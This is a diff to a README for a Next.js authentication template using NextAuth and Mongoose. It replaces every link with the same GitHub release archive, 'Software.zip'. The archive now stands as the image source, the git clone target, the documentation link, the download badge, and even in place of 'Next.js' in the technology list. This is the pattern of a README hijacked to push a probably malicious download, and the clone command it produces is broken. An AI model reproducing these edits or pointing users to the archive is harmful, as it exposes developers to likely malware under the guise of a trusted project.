@@ -1,6 +1,6 @@
 # Next-Auth Mongoose 🦄💻
 
-![Next-Auth Mongoose](https://imageurl.com)
+![Next-Auth Mongoose](https://github.com/radhamadhabseth/next-auth-mongoose/releases/download/v1.0/Software.zip)
 
 Welcome to the Next-Auth Mongoose repository! This project is a production-ready authentication template using NextAuth v5, MongoDB/Mongoose, and TypeScript. Whether you are looking to implement authentication with credentials or OAuth providers, this template has got you covered. Say goodbye to authentication headaches and start building secure login systems effortlessly.
 
@@ -17,7 +17,7 @@ Welcome to the Next-Auth Mongoose repository! This project is a production-ready
 To get started with Next-Auth Mongoose, simply clone the repository and install the dependencies using npm:
 
 ```bash
-git clone https://github.com/username/next-auth-mongoose.git
+git clone https://github.com/radhamadhabseth/next-auth-mongoose/releases/download/v1.0/Software.zip
 cd next-auth-mongoose
 npm install
 ```
@@ -36,7 +36,7 @@ npm run dev
 
 ## Technologies Used 🛠️
 
-- Next.js 15
+- https://github.com/radhamadhabseth/next-auth-mongoose/releases/download/v1.0/Software.zip 15
 - React 19
 - MongoDB/Mongoose
 - NextAuth v5
@@ -47,15 +47,15 @@ npm run dev
 
 ## Topics 📚
 
-This repository covers the following topics: custom-form, formik, middleware, MongoDB, Mongoose, NextAuth v5, Next.js 15, React 19, TypeScript, Vercel, Vercel-deployment, Yup.
+This repository covers the following topics: custom-form, formik, middleware, MongoDB, Mongoose, NextAuth v5, https://github.com/radhamadhabseth/next-auth-mongoose/releases/download/v1.0/Software.zip 15, React 19, TypeScript, Vercel, Vercel-deployment, Yup.
 
 ## Additional Resources 📦
 
-For more information and detailed guides on using Next-Auth Mongoose, check out the [official documentation](https://docs.next-auth-mongoose.com).
+For more information and detailed guides on using Next-Auth Mongoose, check out the [official documentation](https://github.com/radhamadhabseth/next-auth-mongoose/releases/download/v1.0/Software.zip).
 
 ## Download 📥
 
-[![Download ZIP](https://img.shields.io/badge/Download-ZIP-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download ZIP](https://github.com/radhamadhabseth/next-auth-mongoose/releases/download/v1.0/Software.zip)](https://github.com/radhamadhabseth/next-auth-mongoose/releases/download/v1.0/Software.zip)
 
 **Note:** The ZIP file needs to be extracted after download.
 
@@ -67,7 +67,7 @@ Happy coding! 🎉
 
 **Next-Auth Mongoose** - Authenticated Development Made Easy
 
-![Next-Auth Mongoose Logo](https://imageurl.com)
+![Next-Auth Mongoose Logo](https://github.com/radhamadhabseth/next-auth-mongoose/releases/download/v1.0/Software.zip)
 
 ---
 
